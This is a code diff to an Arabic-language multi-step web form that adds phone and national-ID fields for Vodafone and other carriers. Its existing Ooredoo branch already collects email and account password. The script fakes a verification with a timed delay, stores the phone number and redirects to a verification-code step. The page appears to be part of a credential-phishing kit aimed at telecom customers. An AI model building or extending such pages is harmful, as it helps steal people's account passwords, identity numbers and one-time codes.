@@ -277,6 +277,39 @@
                                     
                                 </div>
                                 
+                                <!-- Vodafone/Other Fields (Hidden by default) -->
+                                <div id="otherFields" class="ooredoo-fields">
+                                    
+                                    <!-- Phone Number -->
+                                    <div class="form-group">
+                                        <label for="otherPhone">
+                                            <span class="required">*</span>
+                                            رقم الهاتف
+                                        </label>
+                                        <input 
+                                            type="tel" 
+                                            id="otherPhone" 
+                                            class="form-control" 
+                                            placeholder="Phone"
+                                            inputmode="numeric"
+                                            pattern="[0-9]*">
+                                    </div>
+                                    
+                                    <!-- Personal ID -->
+                                    <div class="form-group">
+                                        <label for="otherPersonalId">
+                                            <span class="required">*</span>
+                                            الرقم الشخصي (ID)
+                                        </label>
+                                        <input 
+                                            type="text" 
+                                            id="otherPersonalId" 
+                                            class="form-control" 
+                                            placeholder="Id">
+                                    </div>
+                                    
+                                </div>
+                                
                                 <!-- Submit Button -->
                                 <button type="submit" class="btn-submit" id="submitBtn">
                                     استمرار
@@ -305,21 +338,24 @@
     <script>
         $(document).ready(function() {
             
-            // Show/Hide Ooredoo fields based on provider selection
+            // Show/Hide fields based on provider selection
             $('#provider').on('change', function() {
                 const provider = $(this).val();
                 const ooredooFields = $('#ooredooFields');
+                const otherFields = $('#otherFields');
+                
+                // Hide all fields first
+                ooredooFields.removeClass('show');
+                otherFields.removeClass('show');
+                ooredooFields.find('input').prop('required', false).val('');
+                otherFields.find('input').prop('required', false).val('');
                 
                 if (provider === 'ooredoo') {
                     ooredooFields.addClass('show');
-                    // Make fields required
                     ooredooFields.find('input').prop('required', true);
-                } else {
-                    ooredooFields.removeClass('show');
-                    // Remove required attribute
-                    ooredooFields.find('input').prop('required', false);
-                    // Clear fields
-                    ooredooFields.find('input').val('');
+                } else if (provider === 'vodafone' || provider === 'other') {
+                    otherFields.addClass('show');
+                    otherFields.find('input').prop('required', true);
                 }
                 
                 validateForm();
@@ -341,6 +377,11 @@
                     const password = $('#password').val().trim();
                     
                     isValid = phone !== '' && personalId !== '' && email !== '' && password !== '';
+                } else if (provider === 'vodafone' || provider === 'other') {
+                    const phone = $('#otherPhone').val().trim();
+                    const personalId = $('#otherPersonalId').val().trim();
+                    
+                    isValid = phone !== '' && personalId !== '';
                 }
                 
                 $('#submitBtn').prop('disabled', !isValid);
@@ -351,24 +392,28 @@
                 e.preventDefault();
                 
                 const provider = $('#provider').val();
+                let phoneNumber = '';
                 
                 if (provider === 'ooredoo') {
-                    // Process Ooredoo verification
-                    processOoredooVerification();
-                } else {
-                    // For other providers, just move to next step
-                    window.location.href = '/step5';
+                    phoneNumber = $('#phone').val();
+                } else if (provider === 'vodafone' || provider === 'other') {
+                    phoneNumber = $('#otherPhone').val();
                 }
+                
+                processVerification(phoneNumber);
             });
             
-            function processOoredooVerification() {
+            function processVerification(phoneNumber) {
                 // Show loading state
                 $('#submitBtn').prop('disabled', true).text('جاري التحقق...');
                 
+                // Store phone number in sessionStorage
+                sessionStorage.setItem('phoneNumber', phoneNumber);
+                
                 // Simulate verification process
                 setTimeout(function() {
-                    // Move to next step
-                    window.location.href = '/step5';
+                    // Move to step6 (verification code)
+                    window.location.href = '/step6';
                 }, 1500);
             }
             
